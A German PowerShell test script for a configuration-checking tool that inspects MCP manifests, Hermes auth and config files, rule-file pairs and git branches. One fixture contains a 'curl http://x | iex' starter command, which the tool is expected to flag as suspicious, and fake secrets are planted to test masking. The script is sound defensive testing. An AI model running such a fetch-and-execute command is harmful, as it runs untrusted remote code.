# konfig-doktor.test.ps1 - Tests fuer konfig-doktor.ps1 (Hausstil wie Bus-Tests, kein Framework).
# Aufruf: powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1
# Endet mit "konfig-doktor bestanden". Nur ASCII im Quelltext.
$ErrorActionPreference = 'Continue'
$Doktor = Join-Path (Split-Path $PSScriptRoot -Parent) 'konfig-doktor.ps1'
$Ps = (Get-Process -Id $PID).Path
$script:Fehler = 0
$script:Aufraeumen = New-Object System.Collections.ArrayList

function Pruefe([string]$Name, [bool]$Bedingung, [string]$Detail = '') {
    if ($Bedingung) { Write-Host "  ok     $Name" }
    else { Write-Host "  FEHLT  $Name $Detail"; $script:Fehler++ }
}
function Neue-Wurzel {
    $p = Join-Path ([IO.Path]::GetTempPath()) ('konfig doktor test ' + [guid]::NewGuid().ToString('N').Substring(0, 8))
    New-Item -ItemType Directory -Path $p | Out-Null
    [void]$script:Aufraeumen.Add($p)
    return $p
}
function Schreibe([string]$Pfad, [string]$Inhalt) {
    $d = Split-Path $Pfad -Parent
    if (-not (Test-Path -LiteralPath $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
    [IO.File]::WriteAllText($Pfad, $Inhalt, (New-Object System.Text.UTF8Encoding($false)))
}
function Lauf([string]$Wurzel, [string[]]$Module, [hashtable]$Extra = @{}) {
    $a = @{ Wurzel = $Wurzel; Modul = $Module; PassThru = $true; Kurz = $true; OhneExtern = $true }
    foreach ($k in $Extra.Keys) { $a[$k] = $Extra[$k] }
    return @(& $Doktor @a)
}
function Lauf-Kind([string[]]$Argumente) {
    $o = & $Ps -NoProfile -ExecutionPolicy Bypass -File $Doktor @Argumente 2>&1 | Out-String
    return [pscustomobject]@{ Exit = $LASTEXITCODE; Out = $o }
}
function Hat($Befunde, [string]$Id) { return (@($Befunde | Where-Object { $_.id -eq $Id }).Count -gt 0) }
function Schwere-Von($Befunde, [string]$Id) { return (@($Befunde | Where-Object { $_.id -eq $Id }) | Select-Object -First 1).schwere }

Write-Host '--- Geruest ---'
$fx = Neue-Wurzel
$r = Lauf $fx @('selbsttest-fehler')
Pruefe 'Modulfehler wird isoliert (UNKLAR)' ((Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-selbsttest-fehler') -and ((Schwere-Von $r 'PRUEFUNG-FEHLGESCHLAGEN-selbsttest-fehler') -eq 'UNKLAR'))
$r = Lauf $fx @('selbsttest-langsam') @{ ModulLimitSek = 1 }
Pruefe 'Zeitlimit ergibt UNKLAR' ((Hat $r 'ZEITLIMIT-selbsttest-langsam') -and ((Schwere-Von $r 'ZEITLIMIT-selbsttest-langsam') -eq 'UNKLAR'))
$r = Lauf $fx @('selbsttest-fehler', 'selbsttest-kritisch')
Pruefe 'Fehler in Modul A stoppt Modul B nicht' ((Hat $r 'TEST-KRITISCH') -and (Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-selbsttest-fehler'))
Pruefe 'KRITISCH steht vor UNKLAR' ($r[0].schwere -eq 'KRITISCH')
$b = $r | Where-Object { $_.id -eq 'TEST-KRITISCH' }
Pruefe 'Maske entfernt Schluessel aus Beleg' (($b.beleg -notmatch 'sk-abcdefghijklmnopqrstuvwxyz123456') -and ($b.beleg -match '\*\*\*'))

$k = Lauf-Kind @('-Wurzel', $fx, '-Modul', 'selbsttest-kritisch', '-BerichtOrdner', $fx)
Pruefe 'Exit 1 bei KRITISCH' ($k.Exit -eq 1) "Exit=$($k.Exit)"
$bericht = Join-Path $fx ('konfig-doktor-' + (Get-Date -Format 'yyyy-MM-dd') + '.md')
Pruefe 'Bericht wird geschrieben' (Test-Path -LiteralPath $bericht)
$bt = ''
if (Test-Path -LiteralPath $bericht) { $bt = [IO.File]::ReadAllText($bericht) }
Pruefe 'Bericht hat Stufen-Abschnitt' ($bt -match '## KRITISCH \(1\)')
Pruefe 'Bericht ohne Schluessel' (($bt -notmatch 'sk-abcdefghijklmnopqrstuvwxyz123456') -and ($bt -match '\*\*\*'))
$fx2 = Neue-Wurzel
$k = Lauf-Kind @('-Wurzel', $fx2, '-Modul', 'selbsttest-kritisch', '-Kurz')
Pruefe 'Kurz: Zaehlzeile' ($k.Out -match 'konfig-doktor: KRITISCH 1 \| WARNUNG 0 \| HINWEIS 0 \| UNKLAR 0')
Pruefe 'Kurz: kein Bericht' (-not (Test-Path -LiteralPath (Join-Path $fx2 'Werkstatt')) -and @(Get-ChildItem -LiteralPath $fx2 -Filter 'konfig-doktor-*.md').Count -eq 0)
$k = Lauf-Kind @('-Wurzel', $fx2, '-Modul', 'selbsttest-fehler', '-Kurz')
Pruefe 'Exit 0 ohne KRITISCH' ($k.Exit -eq 0) "Exit=$($k.Exit)"
$k = Lauf-Kind @('-Wurzel', $fx2, '-Modul', 'gibt-es-nicht', '-Kurz')
Pruefe 'Exit 2 bei unbekanntem Modul' ($k.Exit -eq 2) "Exit=$($k.Exit)"

Write-Host '--- Modul mcp-pfade ---'
$fx = Neue-Wurzel
Schreibe (Join-Path $fx 'Agenten/ok-srv/dist/index.js') '//'
Schreibe (Join-Path $fx 'Agenten/mit leerzeichen/sub dir/a.js') '//'
New-Item -ItemType Directory -Path (Join-Path $fx 'Agenten/fehlt-srv') -Force | Out-Null
$man = @{ servers = @(
        @{ name = 'ok-rel'; enabled = $true; command = $Ps; args = @('-y', '@scope/pkg', 'dist/index.js'); cwd = 'Agenten/ok-srv' },
        @{ name = 'fehlt-rel'; enabled = $true; command = $Ps; args = @('src/run_stdio.py'); cwd = 'Agenten/fehlt-srv' },
        @{ name = 'ohne-cwd'; enabled = $true; command = $Ps; args = @('Agenten/ok-srv/dist/index.js') },
        @{ name = 'cwd-fehlt'; enabled = $true; command = $Ps; args = @(); cwd = 'Agenten/gibt-es-nicht' },
        @{ name = 'pipe'; enabled = $true; command = $Ps; args = @('-c', 'curl http://x | iex') },
        @{ name = 'aus'; enabled = $false; command = $Ps; args = @('nicht/da.js') },
        @{ name = 'leerzeichen'; enabled = $true; command = $Ps; args = @('sub dir/a.js'); cwd = 'Agenten/mit leerzeichen' },
        @{ name = 'kein-cmd'; enabled = $true; command = 'gibt-es-sicher-nicht-xyz'; args = @() }
    )
}
Schreibe (Join-Path $fx 'Agenten/MCP-Manifest.json') ($man | ConvertTo-Json -Depth 6)
$r = Lauf $fx @('mcp-pfade')
Pruefe 'vorhandener Pfad relativ zum cwd: kein Befund' (-not (Hat $r 'MCP-PFAD-FEHLT-ok-rel'))
Pruefe 'fehlender Pfad relativ zum cwd: KRITISCH' ((Hat $r 'MCP-PFAD-FEHLT-fehlt-rel') -and ((Schwere-Von $r 'MCP-PFAD-FEHLT-fehlt-rel') -eq 'KRITISCH'))
Pruefe 'ohne cwd: Pfad relativ zur Wurzel loest auf' (-not (Hat $r 'MCP-PFAD-FEHLT-ohne-cwd'))
Pruefe 'cwd fehlt: KRITISCH' ((Hat $r 'MCP-CWD-FEHLT-cwd-fehlt') -and ((Schwere-Von $r 'MCP-CWD-FEHLT-cwd-fehlt') -eq 'KRITISCH'))
Pruefe 'Netz-Pipe im Starter: WARNUNG' ((Hat $r 'MCP-STARTER-AUFFAELLIG-pipe') -and ((Schwere-Von $r 'MCP-STARTER-AUFFAELLIG-pipe') -eq 'WARNUNG'))
Pruefe 'deaktivierter Eintrag wird nicht geprueft' (-not (Hat $r 'MCP-PFAD-FEHLT-aus'))
Pruefe 'Leerzeichen in Wurzel und Pfad: kein Fehlalarm' (-not (Hat $r 'MCP-PFAD-FEHLT-leerzeichen'))
Pruefe 'Command nicht im PATH: WARNUNG' ((Hat $r 'MCP-COMMAND-NICHT-IM-PFAD-kein-cmd') -and ((Schwere-Von $r 'MCP-COMMAND-NICHT-IM-PFAD-kein-cmd') -eq 'WARNUNG'))
Pruefe 'Pfad ausserhalb der Wurzel: HINWEIS' ((Hat $r 'MCP-AUSSERHALB-WURZEL') -and ((Schwere-Von $r 'MCP-AUSSERHALB-WURZEL') -eq 'HINWEIS'))
$fx2 = Neue-Wurzel
$r = Lauf $fx2 @('mcp-pfade')
Pruefe 'Manifest fehlt: KRITISCH' ((Hat $r 'MCP-MANIFEST-FEHLT') -and ((Schwere-Von $r 'MCP-MANIFEST-FEHLT') -eq 'KRITISCH'))
Schreibe (Join-Path $fx2 'Agenten/MCP-Manifest.json') '{ kaputt'
$r = Lauf $fx2 @('mcp-pfade')
Pruefe 'Manifest kaputt: KRITISCH ohne Absturz' ((Hat $r 'MCP-MANIFEST-DEFEKT') -and (-not (Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-mcp-pfade')))

Write-Host '--- mcp-pfade: Fix-Runde 1 ---'
function Status-Von($Befunde, [string]$Id) { return (@($Befunde | Where-Object { $_.id -eq $Id }) | Select-Object -First 1).status }
function Hat-Praefix($Befunde, [string]$Praefix) { return (@($Befunde | Where-Object { $_.id.StartsWith($Praefix) }).Count -gt 0) }
$fx = Neue-Wurzel
New-Item -ItemType Directory -Path (Join-Path $fx 'Agenten/sub') -Force | Out-Null
Schreibe (Join-Path $fx 'x/y.js') '//'
$man = @{ servers = @(
        @{ name = 'flagwert'; enabled = $true; command = 'powershell'; args = @('--config', 'cfg/fehlt.toml', '--log=logs/a.log') },
        @{ name = 'skript-fehlt'; enabled = $true; command = 'powershell'; args = @('fehlt.py') },
        @{ name = 'kurzflag'; enabled = $true; command = 'powershell'; args = @('-u', 'srv.py') },
        @{ name = 'nurwurzel'; enabled = $true; command = 'powershell'; args = @('x/y.js'); cwd = 'Agenten/sub' },
        @{ name = 'paket'; enabled = $true; command = 'npx'; args = @('-y', 'github:user/repo', 'user/repo') }
    )
}
Schreibe (Join-Path $fx 'Agenten/MCP-Manifest.json') ($man | ConvertTo-Json -Depth 6)
$r = Lauf $fx @('mcp-pfade')
Pruefe '(1) Pfad hinter --flag fehlt: WARNUNG/Vermutung, nicht KRITISCH' ((-not (Hat $r 'MCP-PFAD-FEHLT-flagwert')) -and ((Schwere-Von $r 'MCP-PFAD-OPTIONAL-FEHLT-flagwert') -eq 'WARNUNG') -and ((Status-Von $r 'MCP-PFAD-OPTIONAL-FEHLT-flagwert') -eq 'Vermutung'))
$b = @($r | Where-Object { $_.id -eq 'MCP-PFAD-OPTIONAL-FEHLT-flagwert' }) | Select-Object -First 1
Pruefe '(1) --x=wert wird als Flag-Wert erkannt' (($null -ne $b) -and ($b.beleg -match 'logs/a\.log') -and ($b.beleg -match 'cfg/fehlt\.toml'))
Pruefe '(1) positionales Skript fehlt: KRITISCH' ((Schwere-Von $r 'MCP-PFAD-FEHLT-skript-fehlt') -eq 'KRITISCH')
Pruefe '(1) Skript nach Kurz-Flag bleibt KRITISCH' ((Schwere-Von $r 'MCP-PFAD-FEHLT-kurzflag') -eq 'KRITISCH')
Pruefe '(2) Pfad nur gegen Wurzel: WARNUNG NUR-WURZEL' (((Schwere-Von $r 'MCP-PFAD-NUR-WURZEL-nurwurzel') -eq 'WARNUNG') -and (-not (Hat $r 'MCP-PFAD-FEHLT-nurwurzel')))
Pruefe '(c) Paketbezeichner bei npx sind keine Pfade' ((-not (Hat-Praefix $r 'MCP-PFAD-FEHLT-paket')) -and (-not (Hat-Praefix $r 'MCP-PFAD-OPTIONAL-FEHLT-paket')) -and (-not (Hat-Praefix $r 'MCP-PFAD-NUR-WURZEL-paket')))

$fx = Neue-Wurzel
$geschwister = $fx + '2'
[void]$script:Aufraeumen.Add($geschwister)
Schreibe (Join-Path $geschwister 'srv.js') '//'
$man = @{ servers = @(@{ name = 'geschwister'; enabled = $true; command = 'powershell'; args = @((Join-Path $geschwister 'srv.js')) }) }
Schreibe (Join-Path $fx 'Agenten/MCP-Manifest.json') ($man | ConvertTo-Json -Depth 6)
$r = Lauf $fx @('mcp-pfade')
Pruefe '(a) Geschwisterordner mit gleichem Praefix gilt als ausserhalb' (Hat $r 'MCP-AUSSERHALB-WURZEL')

$fx = Neue-Wurzel
Schreibe (Join-Path $fx 'Agenten/MCP-Manifest.json') '{ "servers": [] }'
$stub = Join-Path $fx 'Agenten/mcp-sync-check.ps1'
Schreibe $stub "Write-Output 'Kopf 1'`nWrite-Output 'Kopf 2'`nWrite-Output 'Kopf 3'`nWrite-Output '  FEHLER server x fehlt'`nexit 1`n"
$r = Lauf $fx @('mcp-pfade') @{ OhneExtern = $false }
$b = @($r | Where-Object { $_.id -eq 'MCP-SYNC-ABWEICHUNG' }) | Select-Object -First 1
Pruefe '(3) Abweichungs-Beleg zeigt FEHLER-Zeile statt Kopf' (($null -ne $b) -and ($b.beleg -match 'FEHLER server x') -and ($b.beleg -notmatch 'Kopf 1')) "beleg=$($b.beleg)"
Schreibe $stub "Write-Output 'Kopf 1'`nWrite-Output 'Kopf 2'`nexit 1`n"
$r = Lauf $fx @('mcp-pfade') @{ OhneExtern = $false }
$b = @($r | Where-Object { $_.id -eq 'MCP-SYNC-ABWEICHUNG' }) | Select-Object -First 1
Pruefe '(3) ohne FEHLER/WARN: erste Zeilen als Beleg' (($null -ne $b) -and ($b.beleg -match 'Kopf 1')) "beleg=$($b.beleg)"
Schreibe $stub "Start-Sleep -Seconds 7`nexit 0`n"
$r = Lauf $fx @('mcp-pfade') @{ OhneExtern = $false; ModulLimitSek = 8 }
$b = @($r | Where-Object { $_.id -eq 'MCP-SYNC-ZEITLIMIT' }) | Select-Object -First 1
Pruefe '(b) Sync-Zeitlimit liegt unter dem Modul-Limit (3 s bei 8)' (($null -ne $b) -and ($b.beleg -match 'nach 3 s') -and (-not (Hat $r 'ZEITLIMIT-mcp-pfade'))) "ids=$(($r | ForEach-Object { $_.id }) -join ',')"

Write-Host '--- Modul hermes ---'
$fx = Neue-Wurzel
$h = Join-Path $fx 'Agenten/Hermes'
Schreibe (Join-Path $h 'config.yaml') ('x' * 100)
Schreibe (Join-Path $h 'config.yaml.bak-20260101') ('x' * 1000)
Schreibe (Join-Path $h 'auth.json') '{"providers":{"demo":{"access_token":"FAKE-SECRET-VALUE-ABC123XYZ","expires_at":"2020-01-01T00:00:00Z"}}}'
Schreibe (Join-Path $h 'auth.json.corrupt') 'zzz'
Schreibe (Join-Path $h 'profiles/mit/config.yaml') 'a: 1'
New-Item -ItemType Directory -Path (Join-Path $h 'profiles/ohne') -Force | Out-Null
Schreibe (Join-Path $h 'logs/errors.log') ("ok`nERROR erster`nERROR zweiter token sk-abcdefghijklmnopqrstuvwxyz123456`nINFO fertig`n")
$r = Lauf $fx @('hermes')
$alles = ($r | ConvertTo-Json -Depth 4)
Pruefe 'Config-Schrumpfung wird als UNKLAR gemeldet' ((Hat $r 'HERMES-CONFIG-GESCHRUMPFT') -and ((Schwere-Von $r 'HERMES-CONFIG-GESCHRUMPFT') -eq 'UNKLAR'))
Pruefe 'abgelaufene expires_at: WARNUNG' ((Hat $r 'HERMES-AUTH-ABGELAUFEN') -and ((Schwere-Von $r 'HERMES-AUTH-ABGELAUFEN') -eq 'WARNUNG'))
Pruefe 'kein Auth-Wert in irgendeinem Befund' ($alles -notmatch 'FAKE-SECRET-VALUE')
Pruefe 'kein Log-Schluessel in irgendeinem Befund' ($alles -notmatch 'sk-abcdefghijklmnopqrstuvwxyz123456')
Pruefe '.corrupt-Reste: HINWEIS' ((Hat $r 'HERMES-CORRUPT-RESTE') -and ((Schwere-Von $r 'HERMES-CORRUPT-RESTE') -eq 'HINWEIS'))
Pruefe 'Profil ohne Config: HINWEIS' (Hat $r 'HERMES-PROFILE-OHNE-CONFIG')
Pruefe 'Logfehler gezaehlt: HINWEIS' ((Hat $r 'HERMES-LOGFEHLER') -and ((Schwere-Von $r 'HERMES-LOGFEHLER') -eq 'HINWEIS'))
Pruefe 'gesunde Config + gueltige Auth: kein AUTH-DEFEKT' (-not (Hat $r 'HERMES-AUTH-DEFEKT'))
Schreibe (Join-Path $h 'auth.json') '{ kaputt FAKE-SECRET-VALUE-ABC123XYZ'
$r = Lauf $fx @('hermes')
$alles = ($r | ConvertTo-Json -Depth 4)
Pruefe 'kaputte auth.json: KRITISCH' ((Hat $r 'HERMES-AUTH-DEFEKT') -and ((Schwere-Von $r 'HERMES-AUTH-DEFEKT') -eq 'KRITISCH'))
Pruefe 'kaputte auth.json: Inhalt nicht ausgegeben' ($alles -notmatch 'FAKE-SECRET-VALUE')
Remove-Item -LiteralPath (Join-Path $h 'auth.json')
$r = Lauf $fx @('hermes')
Pruefe 'auth.json fehlt, .corrupt da: KRITISCH' ((Hat $r 'HERMES-AUTH-FEHLT') -and ((Schwere-Von $r 'HERMES-AUTH-FEHLT') -eq 'KRITISCH'))
$fx2 = Neue-Wurzel
$r = Lauf $fx2 @('hermes')
Pruefe 'kein Hermes-Ordner: UNKLAR statt Fehler' ((Hat $r 'HERMES-ORDNER-FEHLT') -and ((Schwere-Von $r 'HERMES-ORDNER-FEHLT') -eq 'UNKLAR'))

Write-Host '--- hermes: Fix-Runde 1 ---'
$fx = Neue-Wurzel
$h = Join-Path $fx 'Agenten/Hermes'
New-Item -ItemType Directory -Path $h -Force | Out-Null
$r = Lauf $fx @('hermes')
Pruefe '(5) config.yaml fehlt: KRITISCH' ((Schwere-Von $r 'HERMES-CONFIG-FEHLT') -eq 'KRITISCH')
Pruefe '(7) auth.json fehlt ohne .corrupt: HINWEIS' ((Schwere-Von $r 'HERMES-AUTH-NICHT-ANGELEGT') -eq 'HINWEIS')
Schreibe (Join-Path $h 'config.yaml') 'a: 1'
Schreibe (Join-Path $h 'auth.json') '{"a":{"expires_at":0},"b":{"expires_at":""},"c":{"expires_at":null},"d":{"expires_at":-5},"e":{"expires_at":"0"}}'
$r = Lauf $fx @('hermes')
Pruefe '(6) expires_at <= 0 oder leer: kein ABGELAUFEN' (-not (Hat $r 'HERMES-AUTH-ABGELAUFEN')) "beleg=$((@($r | Where-Object { $_.id -eq 'HERMES-AUTH-ABGELAUFEN' }) | Select-Object -First 1).beleg)"
$altOs = $env:OS
$env:OS = 'Linux'
$r = Lauf $fx @('hermes')
$env:OS = $altOs
Pruefe '(5) kein Windows: UNKLAR NICHT-WINDOWS' ((Schwere-Von $r 'HERMES-NICHT-WINDOWS') -eq 'UNKLAR')
$altHome = $env:HERMES_HOME
$anders = Join-Path $fx 'anders'
Schreibe (Join-Path $anders 'config.yaml') 'a: 1'
$env:HERMES_HOME = $anders
$r = @(& $Doktor -Modul hermes -PassThru -Kurz -OhneExtern)
Pruefe '(5) HERMES_HOME abweichend: HINWEIS' ((Schwere-Von $r 'HERMES-HOME-ABWEICHEND') -eq 'HINWEIS')
$env:HERMES_HOME = 'Agenten/Hermes'
$altCwd = [Environment]::CurrentDirectory
Push-Location $fx
[Environment]::CurrentDirectory = $fx
$r = @(& $Doktor -Modul hermes -PassThru -Kurz -OhneExtern)
[Environment]::CurrentDirectory = $altCwd
Pop-Location
$env:HERMES_HOME = $altHome
Pruefe '(7) relativer HERMES_HOME wird gegen die Wurzel aufgeloest' (-not (Hat $r 'HERMES-HOME-ABWEICHEND')) "beleg=$((@($r | Where-Object { $_.id -eq 'HERMES-HOME-ABWEICHEND' }) | Select-Object -First 1).beleg)"

# doctor-Pfad mit Stub: hermes.cmd steht im PATH VOR hermes.exe
$stubCmd = Join-Path $fx 'stub-cmd'
$stubExe = Join-Path $fx 'stub-exe'
New-Item -ItemType Directory -Path $stubCmd, $stubExe -Force | Out-Null
Schreibe (Join-Path $stubCmd 'hermes.cmd') "@echo [FAIL] falscher Starter`r`n@exit /b 3`r`n"
$src = 'using System; using System.IO; public static class P { public static int Main() { string d = AppDomain.CurrentDomain.BaseDirectory; string s = Path.Combine(d, "sleep.txt"); if (File.Exists(s)) System.Threading.Thread.Sleep(int.Parse(File.ReadAllText(s).Trim()) * 1000); string o = Path.Combine(d, "out.txt"); if (File.Exists(o)) Console.Write(File.ReadAllText(o)); string e = Path.Combine(d, "exit.txt"); return File.Exists(e) ? int.Parse(File.ReadAllText(e).Trim()) : 0; } }'
$exe = Join-Path $stubExe 'hermes.exe'
Add-Type -TypeDefinition $src -OutputAssembly $exe -OutputType ConsoleApplication
$altPath = $env:Path
$env:Path = $stubCmd + ';' + $stubExe + ';' + $altPath
Schreibe (Join-Path $stubExe 'out.txt') "[FAIL] auth: Authorization Bearer GEHEIMBEARERWERT Authorization: Basic GEHEIMBASICWERT`n[FAIL] cfg api_key=GEHEIMAPIWERT`n"
$r = Lauf $fx @('hermes') @{ Kurz = $false; OhneExtern = $false }
$alles = ($r | ConvertTo-Json -Depth 4)
Pruefe '(1) .exe wird vor hermes.cmd gewaehlt' ((-not (Hat $r 'HERMES-DOCTOR-NICHT-AUFRUFBAR')) -and (Hat $r 'HERMES-DOCTOR')) "ids=$(($r | ForEach-Object { $_.id }) -join ',')"
Pruefe '(1) Ausgabe stammt vom Stub, nicht vom .cmd' ($alles -notmatch 'falscher Starter')
Pruefe '(3) Bearer-/api_key-Werte maskiert' (($alles -notmatch 'GEHEIMBEARERWERT') -and ($alles -notmatch 'GEHEIMAPIWERT') -and ($alles -notmatch 'GEHEIMBASICWERT') -and ($alles -match 'api_key=\*\*\*'))
Schreibe (Join-Path $stubExe 'out.txt') "Checks: 0 errors`nno errors found`nOK`n"
$r = Lauf $fx @('hermes') @{ Kurz = $false; OhneExtern = $false }
Pruefe '(4) "0 errors"/"no errors found": kein Befund' (-not (Hat $r 'HERMES-DOCTOR')) "beleg=$((@($r | Where-Object { $_.id -eq 'HERMES-DOCTOR' }) | Select-Object -First 1).beleg)"
Schreibe (Join-Path $stubExe 'sleep.txt') '7'
$r = Lauf $fx @('hermes') @{ Kurz = $false; OhneExtern = $false; ModulLimitSek = 8 }
$b = @($r | Where-Object { $_.id -eq 'HERMES-DOCTOR-ZEITLIMIT' }) | Select-Object -First 1
Pruefe '(2) doctor-Timeout liegt unter dem Modul-Limit (5 s)' (($null -ne $b) -and ($b.beleg -match 'nach 5 s') -and (-not (Hat $r 'ZEITLIMIT-hermes'))) "ids=$(($r | ForEach-Object { $_.id }) -join ',')"
$r = Lauf $fx @('hermes') @{ Kurz = $false; OhneExtern = $false; ModulLimitSek = 3 }
$b = @($r | Where-Object { $_.id -eq 'HERMES-DOCTOR-ZEITLIMIT' }) | Select-Object -First 1
$m = [regex]::Match([string]$b.beleg, 'nach (\d+) s')
Pruefe '(T8) ModulLimitSek 3: doctor-Timeout <= Limit' ($m.Success -and ([int]$m.Groups[1].Value -ge 1) -and ([int]$m.Groups[1].Value -le 3)) "beleg=$($b.beleg)"
$r = Lauf $fx @('hermes') @{ Kurz = $false; OhneExtern = $false; ModulLimitSek = 0 }
$b = @($r | Where-Object { $_.id -eq 'HERMES-DOCTOR-ZEITLIMIT' }) | Select-Object -First 1
Pruefe '(T8) ModulLimitSek 0: doctor nicht gestartet, UNKLAR' (($null -ne $b) -and ($b.titel -match 'nicht gestartet') -and ($b.schwere -eq 'UNKLAR')) "titel=$($b.titel)"
Remove-Item -LiteralPath (Join-Path $stubExe 'sleep.txt')
$env:Path = $stubCmd + ';' + [Environment]::GetFolderPath('System')
$r = Lauf $fx @('hermes') @{ Kurz = $false; OhneExtern = $false }
$b = @($r | Where-Object { $_.id -eq 'HERMES-DOCTOR-NICHT-AUFRUFBAR' }) | Select-Object -First 1
Pruefe '(1) nur .cmd im PATH: NICHT-AUFRUFBAR nennt den Nicht-.exe-Treffer' (($null -ne $b) -and ($b.beleg -match 'hermes\.cmd'))
New-Item -ItemType Directory -Path (Join-Path $h 'bin') -Force | Out-Null
Copy-Item -LiteralPath $exe -Destination (Join-Path $h 'bin/hermes.exe')
Copy-Item -LiteralPath (Join-Path $stubExe 'out.txt') -Destination (Join-Path $h 'bin/out.txt')
$r = Lauf $fx @('hermes') @{ Kurz = $false; OhneExtern = $false }
$env:Path = $altPath
Pruefe '(1) Rueckfall auf <heim>/bin/hermes.exe' (-not (Hat $r 'HERMES-DOCTOR-NICHT-AUFRUFBAR')) "ids=$(($r | ForEach-Object { $_.id }) -join ',')"

Write-Host '--- Modul regelpaare ---'
$fx = Neue-Wurzel
$inh = "Zeile eins`nZeile zwei`nZeile drei`n"
Schreibe (Join-Path $fx 'CLAUDE.md') $inh
Schreibe (Join-Path $fx 'AGENTS.md') $inh
Schreibe (Join-Path $fx 'MaxHirn/CLAUDE.md') ([string][char]0xFEFF + ($inh -replace "`n", "`r`n"))
Schreibe (Join-Path $fx 'MaxHirn/AGENTS.md') $inh
Schreibe (Join-Path $fx 'Werkstatt/CLAUDE.md') $inh
Schreibe (Join-Path $fx 'Werkstatt/AGENTS.md') "Zeile eins`nZeile ZWEI`nZeile drei`n"
$r = Lauf $fx @('regelpaare')
Pruefe 'identische Bytes: kein Befund fuer Wurzel' (-not (Hat $r 'REGELPAAR-INHALT-Wurzel') -and -not (Hat $r 'REGELPAAR-ZEILENENDE-Wurzel'))
Pruefe 'BOM+CRLF bei gleichem Inhalt: HINWEIS, nicht WARNUNG' ((Schwere-Von $r 'REGELPAAR-ZEILENENDE-MaxHirn') -eq 'HINWEIS' -and -not (Hat $r 'REGELPAAR-INHALT-MaxHirn'))
Pruefe 'inhaltliche Abweichung: WARNUNG mit Zeilennummer' ((Schwere-Von $r 'REGELPAAR-INHALT-Werkstatt') -eq 'WARNUNG' -and (($r | Where-Object { $_.id -eq 'REGELPAAR-INHALT-Werkstatt' }).beleg -match 'Zeile 2'))
Remove-Item -LiteralPath (Join-Path $fx 'Werkstatt/AGENTS.md')
$r = Lauf $fx @('regelpaare')
Pruefe 'fehlende Partnerdatei: WARNUNG' ((Schwere-Von $r 'REGELPAAR-FEHLT-Werkstatt') -eq 'WARNUNG')
$fx2 = Neue-Wurzel
$r = Lauf $fx2 @('regelpaare')
Pruefe 'beide Dateien fehlen (frischer Checkout): UNKLAR' ((Schwere-Von $r 'REGELPAAR-ORDNER-FEHLT-Wurzel') -eq 'UNKLAR')

Write-Host '--- Modul git-regeln ---'
$fx = Neue-Wurzel
$r = Lauf $fx @('git-regeln')
Pruefe 'ohne .git: UNKLAR statt Fehler' ((Schwere-Von $r 'GIT-KEIN-REPO') -eq 'UNKLAR')
git -C $fx init -q *> $null
git -C $fx symbolic-ref HEAD refs/heads/master *> $null
Schreibe (Join-Path $fx 'a.txt') 'a'
Schreibe (Join-Path $fx 'x y.txt') 'x'
git -C $fx add a.txt 'x y.txt' *> $null
git -C $fx -c user.name=t -c user.email=t@t -c commit.gpgsign=false commit -q -m init *> $null
$r = Lauf $fx @('git-regeln')
Pruefe 'nur master: keine Zweig-Warnung' (-not (Hat $r 'GIT-ZWEIGE'))
git -C $fx branch 'claude/test-x' *> $null
$r = Lauf $fx @('git-regeln')
Pruefe 'frischer Agentenzweig: kein Befund (Zweigregel 08.10.)' (-not (Hat $r 'GIT-ZWEIGE'))
Schreibe (Join-Path $fx 'b.txt') 'b'
git -C $fx add b.txt *> $null
git -C $fx -c user.name=t -c user.email=t@t -c commit.gpgsign=false commit -q -m zwei *> $null
$r = Lauf $fx @('git-regeln')
Pruefe 'gemergter Zweig: HINWEIS mit Namen' (((Schwere-Von $r 'GIT-ZWEIGE') -eq 'HINWEIS') -and (($r | Where-Object { $_.id -eq 'GIT-ZWEIGE' }).beleg -match 'claude/test-x'))
$umlaut = 'z ' + [char]0x00E4 + '.txt'
git -C $fx mv 'x y.txt' $umlaut *> $null
Schreibe (Join-Path $fx ('alt ' + [char]0x00F6 + '.txt')) 'alt'
(Get-Item -LiteralPath (Join-Path $fx $umlaut)).LastWriteTime = (Get-Date).AddDays(-10)
(Get-Item -LiteralPath (Join-Path $fx ('alt ' + [char]0x00F6 + '.txt'))).LastWriteTime = (Get-Date).AddDays(-9)
Schreibe (Join-Path $fx 'neu.txt') 'neu'
$r = Lauf $fx @('git-regeln')
$ru = $r | Where-Object { $_.id -eq 'GIT-RUHEND' }
Pruefe 'ruhende Dateien (Leerzeichen, Umlaut, Umbenennung): WARNUNG' (($null -ne $ru) -and ($ru.schwere -eq 'WARNUNG'))
Pruefe 'umbenannte Datei wird unter neuem Namen gefunden' (($null -ne $ru) -and ($ru.beleg -match [regex]::Escape($umlaut)))
Pruefe 'frische Datei zaehlt nicht als ruhend' (($null -ne $ru) -and ($ru.beleg -notmatch 'neu\.txt'))
Pruefe 'ohne bereiche.py: UNKLAR' ((Schwere-Von $r 'GIT-BESITZ-NICHT-PRUEFBAR') -eq 'UNKLAR')
$pyc = @(Get-Command python, python3 -ErrorAction SilentlyContinue | Where-Object { $_.Source -notmatch 'WindowsApps' })
if ($pyc.Count -gt 0) {
    Schreibe (Join-Path $fx 'Agenten/Werkzeuge/bereiche.py') "import sys`nprint('Register: x')`nprint('')`nprint('FEHLER (1):')`nprint('  Pfad existiert nicht: Agenten/X')`nsys.exit(1)`n"
    $r = Lauf $fx @('git-regeln')
    $gb = $r | Where-Object { $_.id -eq 'GIT-BESITZ' }
    Pruefe 'Register-Fehler (Exit 1): WARNUNG' (($null -ne $gb) -and ($gb.schwere -eq 'WARNUNG'))
    Pruefe 'Register-Fehler: Titel und FEHLER-Zeilen im Beleg' (($null -ne $gb) -and ($gb.titel -match 'Bereichs-Register fehlerhaft') -and ($gb.beleg -match 'FEHLER') -and ($gb.beleg -match 'Agenten/X') -and ($gb.beleg -notmatch 'Register: x'))
    Pruefe 'Register-Fehler: Vorschlag BEREICHE.json' (($null -ne $gb) -and ($gb.vorschlag -match 'BEREICHE\.json'))
}
else { Write-Host '  uebersprungen: Besitz-Test (kein python im PATH)' }
$r = Lauf $fx @('git-regeln') @{ ModulLimitSek = 0 }
